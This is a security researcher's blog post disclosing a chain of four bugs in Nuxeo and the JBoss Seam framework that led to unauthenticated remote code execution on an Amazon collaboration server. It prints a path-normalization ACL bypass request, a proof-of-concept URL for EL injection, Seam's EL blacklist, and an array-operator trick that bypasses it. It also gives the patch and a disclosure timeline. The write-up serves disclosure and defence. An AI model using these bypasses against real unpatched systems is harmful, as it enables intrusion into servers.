---
source: orange-tsai
source_url: https://blog.orange.tw/posts/2018-08-how-i-chained-4-bugs-features-into-rce-on-amazon/
title: "How I Chained 4 Bugs (Features?) into RCE on Amazon Collaboration System | Orange Tsai"
author: "Orange Tsai"
published: 2018-08-10T16:00:00.000Z
description: "Hi! This is the case study in my Black Hat USA 2018 and DEFCON 26 talk, you can also check slides here: Breaking Parser Logic! Take Your Path Normalization Off and Pop 0days Out In past two yea"
---

* * *

![preview](https://blog.orange.tw/posts/2018-08-how-i-chained-4-bugs-features-into-rce-on-amazon/21dbb5d9feac7693-02.png)

Hi! This is the case study in my [Black Hat USA 2018](https://www.blackhat.com/us-18/briefings/schedule/speakers.html#orange-tsai-35248) and [DEFCON 26](https://www.defcon.org/html/defcon-26/dc-26-speakers.html#Tsai) talk, you can also check slides here:

- [Breaking Parser Logic! Take Your Path Normalization Off and Pop 0days Out](http://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf)

In past two years, I started to pay more attention on the “inconsistency” bug. What’s that? It’s just like my [SSRF talk in Black Hat](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf) and [GitHub SSRF to RCE case](http://blog.orange.tw/2017/07/how-i-chained-4-vulnerabilities-on.html) last year, finding inconsistency between the URL parser and the URL fetcher that leads to whole SSRF bypass!

There is also another very cool article [Bypassing Web-Application Firewalls by abusing SSL/TLS](https://0x09al.github.io/waf/bypass/ssl/2018/07/02/web-application-firewall-bypass.html) to illustrate how “inconsistency” be awesome by [@0x09AL](https://twitter.com/0x09AL)

So this year, I started focus on the “inconsistency” which lies in the path parser and path normalization!

It’s hard to write a well-designed parser. Different entity has its own standard and implementation. In order to fix a bug without impacting business logic, it’s common to apply a work-around or a filter instead of patching the bug directly. Therefore, if there is any inconsistency between the filter and the called method, the security mechanism can be easily bypassed!

While I was reading advisories, I noticed a feature called URL Path Parameter. Some researchers have already pointed out this feature may lead to security issues, but it still depends on the programming failure! With a little bit mind-mapping, I found this feature could be perfectly applied on multi-layered architectures, and this is **vulnerable by default without any coding failure**. If you are using reverse proxy with Java as your back-end service, you are under threat!

Back to 2015, it was the first time I found this attack surface was during in a red teaming. After that, I realized this was really cool and I’m curious about how many people know that. So I made a [challenge](https://github.com/orangetw/My-CTF-Web-Challenges#blackbox) for [WCTF 2016](http://ctf.360.com/2016/en/index.html).

_P.S. I have checked scanners in DirBuster, wFuzz, DirB and DirSearch. Until now, only DirSearch joined the pattern on [1 May, 2017](https://github.com/maurosoria/dirsearch/commit/9496597cd03d91b29bf3f2e9b0a73f8df23cb3af)_

WCTF is a competition held by Belluminar and 360. It’s not similar to general [Jeopardy or Attack & Defense](https://ctftime.org/ctf-wtf/) in other CTF competitions. It invites top 10 teams from all over the world, and every team needs to design two challenges, so there are 20 challenges! The more challenges you solved, the more points you got. However, no one solved my challenge during the competition. Therefore, I think this trick may not be well-known!

This year, I decide to share this technique. In order to convince review boards this is awesome, I need more cases to prove it works! So I started hunting bugs! It turns out that, this attack surface can not only leak information but also bypass ACL(Such as my Uber OneLogin bypass [case](https://hackerone.com/reports/326080)) and lead to RCE in several bug bounty programs. This post is one of them!

If you are interested in other stories, please check [the slide](http://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf) ASAP!!!

↓ The inconsistency in multi-layered architectures!

![](https://blog.orange.tw/posts/2018-08-how-i-chained-4-bugs-features-into-rce-on-amazon/819d6d0ad207990d-01.png)

# [Foreword](https://blog.orange.tw/posts/2018-08-how-i-chained-4-bugs-features-into-rce-on-amazon/\#Foreword "Foreword") Foreword

First, thanks Amazon for the open-minded vulnerability disclosure. It’s a really good experience working with Amazon security team(so does Nuxeo team). From the [Timeline](https://www.blogger.com/blogger.g?blogID=2987759532072489303#timeline), you can see how quick Amazon’s response was and the step they have taken!

The whole story started with a domain [collaborate-corp.amazon.com](http://collaborate-corp.amazon.com/). It seems to be a collaboration system for internal purpose. From the copyright in the bottom, we know this system was built from an open source project [Nuxeo](https://github.com/nuxeo/nuxeo). It’s a very huge Java project, and I was just wanting to improve my Java auditing skill. So the story begins from that…!

# [Bugs](https://blog.orange.tw/posts/2018-08-how-i-chained-4-bugs-features-into-rce-on-amazon/\#Bugs "Bugs") Bugs

For me, when I get a Java source, the first thing is to read the `pom.xml` and find if there are any outdated packages. In Java ecosystem, most vulnerabilities are due to the [OWASP Top 10 - A9. known vulnerable components](https://www.owasp.org/index.php/Top_10-2017_A9-Using_Components_with_Known_Vulnerabilities).

Is there any Struts2, FastJSON, XStream or components with deserialization bugs before? If yes. Congratz!

In Nuxeo, it seems most of packages are up to date. But I find a old friend - Seam Framework. Seam is a web application framework developed by JBoss, and a division of Red Hat. It **HAD BEEN** a popular web framework several years ago, but there are still lots of applications based on Seam :P

I have reviewed Seam in 2016 and found numerous [hacker-friendly features](https://blog.orange.tw/2016/12/java-web.html)! (Sorry, it’s only in Chinese) However, it looks like we can not direct access the Seam part. But still remark on this, and keep on going!

## [1. Path normalization bug leads to ACL bypass](https://blog.orange.tw/posts/2018-08-how-i-chained-4-bugs-features-into-rce-on-amazon/\#1-Path-normalization-bug-leads-to-ACL-bypass "1. Path normalization bug leads to ACL bypass") 1\. Path normalization bug leads to ACL bypass

While looking at the access control from `WEB-INF/web.xml`, we find Nuxeo uses a custom authentication filter `NuxeoAuthenticationFilter` and maps `/*` to that . From the filter we know most pages require authentication, but there is a whitelist allowed few entrance such as `login.jsp`. All of that is implemented in a method `bypassAuth`.

|     |     |
| --- | --- |
| ```<br>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>``` | ```<br>protected boolean bypassAuth(HttpServletRequest httpRequest) {<br>    // init unAuthenticatedURLPrefix<br>    try {<br>        unAuthenticatedURLPrefixLock.readLock().lock();<br>        String requestPage = getRequestedPage(httpRequest);<br>        for (String prefix : unAuthenticatedURLPrefix) {<br>            if (requestPage.startsWith(prefix)) {<br>                return true;<br>            }<br>        }<br>    } finally {<br>        unAuthenticatedURLPrefixLock.readLock().unlock();<br>    }<br>    // ...<br>    return false;<br>}<br>``` |

As you can see, `bypassAuth` retrieves the current requested page to compare with `unAuthenticatedURLPrefix`. But how `bypassAuth` retrieves current requested page? Nuxeo writes a method to extract requested page from `HttpServletRequest.RequestURI`, and the first problem appears here!

|     |     |
| --- | --- |
| ```<br>1<br>2<br>3<br>4<br>5<br>6<br>7<br>``` | ```<br>protected static String getRequestedPage(HttpServletRequest httpRequest) {<br>    String requestURI = httpRequest.getRequestURI();<br>    String context = httpRequest.getContextPath() + '/';<br>    String requestedPage = requestURI.substring(context.length());<br>    int i = requestedPage.indexOf(';');<br>    return i == -1 ? requestedPage : requestedPage.substring(0, i);<br>}<br>``` |

In order to handle URL path parameter, Nuxeo truncates all the trailing parts by semicolon. But the behaviors in URL path parameter are various. Each web server has it’s own implementation. The Nuxeo’s way may be safe in containers like WildFly, JBoss and WebLogic. But it runs under Tomcat! So the difference between the method `getRequestedPage` and the Servlet Container leads to security problems!

Due to the truncation, we can forge a request that matches the whitelist in ACL but reach the unauthorized area in Servlet!

In here, we choose `login.jsp` as our prefix! The ACL bypass may look like this:

|     |     |
| --- | --- |
| ```<br>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>``` | ```<br>$ curl -I https://collaborate-corp.amazon.com/nuxeo/[unauthorized_area]<br>HTTP/1.1 302 Found<br>Location: login.jsp<br>...<br>$ curl -I https://collaborate-corp.amazon.com/nuxeo/login.jsp;/..;/[unauthorized_area]<br>HTTP/1.1 500 Internal Server Error<br>...<br>``` |

As you can see, we bypass the redirection for authentication, but most pages still return a 500 error. It’s because the servlet logic is unable to obtain a valid user principle so it throws a Java `NullPointerException`. Even though, this still gives us a chance to knock the door!

_P.S. Although there is a quicker way to open the door, it’s still worth to write down the first try!_

## [2. Code reuse feature leads to partial EL invocation](https://blog.orange.tw/posts/2018-08-how-i-chained-4-bugs-features-into-rce-on-amazon/\#2-Code-reuse-feature-leads-to-partial-EL-invocation "2. Code reuse feature leads to partial EL invocation") 2\. Code reuse feature leads to partial EL invocation

As I mentioned before, there are numerous hacker-friendly features in Seam framework. So, for me, the next step is chaining the first bug to access unauthorized Seam servlet!

In the following sections, I will explain these “features” one by one in detail!

In order to control where browser should be redirected, Seam introduces a series of HTTP parameter, and it is also buggy in these HTTP parameters… `actionOutcome` is one of them. In 2013, [@meder](https://twitter.com/meder) found a remote code execution on that. You can read the awesome article [CVE-2010-1871: JBoss Seam Framework remote code execution](http://blog.o0o.nu/2010/07/cve-2010-1871-jboss-seam-framework.html) for details! But today, we are going to talk about another one - `actionMethod`!

`actionMethod` is a special parameter that can invoke specific JBoss EL(Expression Language) from query string. It seems dangerous but there are some preconditions before the invocation. The detailed implementation can found in method [callAction](https://github.com/seam2/jboss-seam/blob/f3077fee9d04b2b3545628cd9e6b58c859feb988/jboss-seam/src/main/java/org/jboss/seam/navigation/Pages.java#L697). In order to invoke the EL, it must satisfy the following preconditions:

1. The value of `actionMethod` must be a pair which looks like `FILENAME:EL_CODE`
2. The `FILENAME` part must be a real file under context-root
3. The file `FILENAME` must have the content `"#{EL_CODE}"` in it (double quotes and are required)

For example: There is a file named `login.xhtml` under context-root.

|     |     |
| --- | --- |
| ```<br>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>``` | ```<br><div class="entry"><br>    <div class="label"><br>        <h:outputLabel id="UsernameLabel" for="username">Username:</h:outputLabel><br>    </div><br>    <div class="input"><br>        <s:decorate id="usernameDecorate"><br>            <h:inputText id="username" value="#{user.username}" required="true"></h:inputText><br>        </s:decorate><br>    </div><br></div><br>``` |

You can invoke the EL `user.username` by URL

|     |     |
| --- | --- |
| ```<br>1<br>``` | ```<br>http://host/whatever.xhtml?actionMethod=/foo.xhtml:user.username<br>``` |

## [3. Double evaluation leads to EL injection](https://blog.orange.tw/posts/2018-08-how-i-chained-4-bugs-features-into-rce-on-amazon/\#3-Double-evaluation-leads-to-EL-injection "3. Double evaluation leads to EL injection") 3\. Double evaluation leads to EL injection

The previous feature looks eligible. You can not control any file under context-root so that you can’t invoke arbitrary EL on remote server. However, here is one more crazy feature…

To make things worse, if the previous one returns a string, and the string looks like an EL. Seam framework will **invoke again**!

![](https://blog.orange.tw/posts/2018-08-how-i-chained-4-bugs-features-into-rce-on-amazon/21dbb5d9feac7693-02.png)

Here is the detailed call stack:

1. callAction(Pages.java)
2. handleOutcome(Pages.java)
3. handleNavigation(SeamNavigationHandler.java)
4. interpolateAndRedirect(FacesManager.java)
5. interpolate(Interpolator.java)
6. interpolateExpressions(Interpolator.java)
7. createValueExpression(Expressions.java)

With this crazy feature. We can execute arbitrary EL if we can control the returned value! This is very similar to [ROP(Return-Oriented Programming)](https://en.wikipedia.org/wiki/Return-oriented_programming) in binary exploitation. So we need to find a good gadget!

In this case, we choose the gadget under [widgets/suggest\_add\_new\_directory\_entry\_iframe.xhtml](https://github.com/nuxeo/nuxeo/blob/master/nuxeo-features/nuxeo-platform-ui-select2/src/main/resources/web/nuxeo.war/widgets/suggest_add_new_directory_entry_iframe.xhtml#L19)

|     |     |
| --- | --- |
| ```<br>1<br>2<br>3<br>4<br>5<br>6<br>7<br>``` | ```<br><nxu:set var="directoryNameForPopup"<br>  value="#{request.getParameter('directoryNameForPopup')}"<br>  cache="true"><br><nxu:set var="directoryNameForPopup"<br>  value="#{nxu:test(empty directoryNameForPopup, select2DirectoryActions.directoryName, directoryNameForPopup)}"<br>  cache="true"><br><c:if test="#{not empty directoryNameForPopup}"><br>``` |

Why we choose this? It’s because that `request.getParameter` returns a string that we can control from query string! Although the whole tag is to assign a variable, we can abuse the semantics!

So now, we put our second stage payload in the `directoryNameForPopup`. With the first bug, we can chain them together to execute arbitrary EL without any authentication! Here is the PoC:

|     |     |
| --- | --- |
| ```<br>1<br>2<br>3<br>``` | ```<br>http://host/nuxeo/login.jsp;/..;/create_file.xhtml<br>?actionMethod=widgets/suggest_add_new_directory_entry_iframe.xhtml:request.getParameter('directoryNameForPopup')<br>&directoryNameForPopup=/?#{HERE_IS_THE_EL}<br>``` |

Is that over yet? No really! Although we can execute arbitrary EL, we still failed to pop out a shell. Why?

Let’s go to next section!

## [4. EL blacklist bypass leads to RCE](https://blog.orange.tw/posts/2018-08-how-i-chained-4-bugs-features-into-rce-on-amazon/\#4-EL-blacklist-bypass-leads-to-RCE "4. EL blacklist bypass leads to RCE") 4\. EL blacklist bypass leads to RCE

Seam also knows that EL is insane. Since Seam 2.2.2.Final, there is a new EL blacklist to block dangerous invocations! Unfortunately, Nuxeo uses the latest version of Seam(2.3.1.Final) so that we must find a way to bypass the blacklist. The blacklist can be found in [resources/org/jboss/seam/blacklist.properties](https://github.com/seam2/jboss-seam/blob/f3077fee9d04b2b3545628cd9e6b58c859feb988/jboss-seam/src/main/resources/org/jboss/seam/blacklist.properties).

|     |     |
| --- | --- |
| ```<br>1<br>2<br>3<br>4<br>5<br>``` | ```<br>.getClass(<br>.class.<br>.addRole(<br>.getPassword(<br>.removeRole(<br>``` |

With a little bit studying, we found the blacklist is just a simple string matching, and we all know that blacklist is always a bad idea. The first time I saw this, I recalled the bypass of [Struts2 S2-020](https://cwiki.apache.org/confluence/display/WW/S2-020). The idea of that bypass and this one is the same. Using array-like operators to avoid blacklist patterns! Just change:

|     |     |
| --- | --- |
| ```<br>1<br>``` | ```<br>"".getClass().forName("java.lang.Runtime")<br>``` |

to

|     |     |
| --- | --- |
| ```<br>1<br>``` | ```<br>""["class"].forName("java.lang.Runtime")<br>``` |

Is it simple? Yes! That’s all.

So the last thing is to write the shellcode in JBoss EL. We use Java reflection API to get the `java.lang.Runtime` Object, and list all methods from that. The index 7 is the method `getRuntime()` to return a `Runtime` instance and the index 15 is the method `exec(String)` to execute our command!

OK! Let’s summarize our steps and chain all together!

1. Path normalization bug leads to ACL bypass
2. Bypass whitelist to access unauthorized Seam servlet
3. Use Seam feature `actionMethod` to invoke gadgets in file `suggest_add_new_directory_entry_iframe.xhtml`
4. Prepare second stage payload in HTTP parameter `directoryNameForPopup`
5. Use array-like operators to bypass the EL blacklist
6. Write the shellcode with Java reflection API
7. Wait for our shell back and win like a boss .\_./

Here is the whole exploit:

![](https://blog.orange.tw/posts/2018-08-how-i-chained-4-bugs-features-into-rce-on-amazon/cd394c2ba0a63750-03.png)

OK, by executing the Perl script, we got the shell!

![](https://blog.orange.tw/posts/2018-08-how-i-chained-4-bugs-features-into-rce-on-amazon/59e0ff7714e46416-04.png)

# [The fix](https://blog.orange.tw/posts/2018-08-how-i-chained-4-bugs-features-into-rce-on-amazon/\#The-fix "The fix") The fix

I will illustrate the fix from 3 aspects!

## [1. JBoss](https://blog.orange.tw/posts/2018-08-how-i-chained-4-bugs-features-into-rce-on-amazon/\#1-JBoss "1. JBoss") 1\. JBoss

As the most buggy thing is on Seam framework. I have reported these “features” to `security@jboss.org` in Sept 2016. But their reply is:

> Thanks very much for reporting these issues to us.
>
> Seam was only included in EAP 5, not 6, or 7. EAP is near the end of maintenance support, which will end in Nov 2016, \[1\]. The upstream version you used to test was released over 3 years ago.
>
> During maintenance support EAP 5 only receives patches for important or critical issues. While you highlight that RCE is possible, only on the precondition that the attack can first upload a file. This seems to reduce the impact to moderate.
>
> I think we will not bother to fix these security issues at this stage of the Seam project lifecycle.
>
> \[1\] [https://access.redhat.com/support/policy/updates/jboss\_notes/](https://access.redhat.com/support/policy/updates/jboss_notes/)
>
> We do appreciate your efforts in reporting these issues to us, and hope that you will continue to inform us of security issues in the future.

So due to the EOL, there seems to be no official patch for these crazy features. However, lots of Seam applications are still running in the world. So if you use Seam. I recommend you to mitigate this with Nuxeo’s fix.

## [2. Amazon](https://blog.orange.tw/posts/2018-08-how-i-chained-4-bugs-features-into-rce-on-amazon/\#2-Amazon "2. Amazon") 2\. Amazon

With a rapid investigation, Amazon security team isolated the server, discussed with the reporter about how to mitigate, and listed every step they have taken in detail! It’s a good experience working with them :)

## [3. Nuxeo](https://blog.orange.tw/posts/2018-08-how-i-chained-4-bugs-features-into-rce-on-amazon/\#3-Nuxeo "3. Nuxeo") 3\. Nuxeo

After the notification from Amazon, Nuxeo quickly released a patch in version 8.10. The patch overrides the method `callAction()` to fix the crazy feature! If you need the patch for your Seam application. You can refer [the patch here](https://github.com/nuxeo/jboss-seam/commit/f263738af8eac44cda7a41ea088c99e69a4edb48)!

# [Timeline](https://blog.orange.tw/posts/2018-08-how-i-chained-4-bugs-features-into-rce-on-amazon/\#Timeline "Timeline") Timeline

- 10 March, 2018 01:13 GMT+8 Report to Amazon security team via `aws-security@amazon.com`
- 10 March, 2018 01:38 GMT+8 Receive that they are under investigating
- 10 March, 2018 03:12 GMT+8 Ask that can I join the conference call with security team
- 10 March, 2018 05:30 GMT+8 Conference call with Amazon, get the status and the step they have taken for the vulnerability
- 10 March, 2018 16:05 GMT+8 Ask if it’s possible public disclosure on my Black Hat talk
- 15 March, 2018 04:58 GMT+8 Nuxeo released a new version 8.10 that patched the RCE vulnerability
- 15 March, 2018 23:00 GMT+8 Conference call with Amazon, know the status and discuss public disclosure details
- 05 April, 2018 05:40 GMT+8 Reward the award from Amazon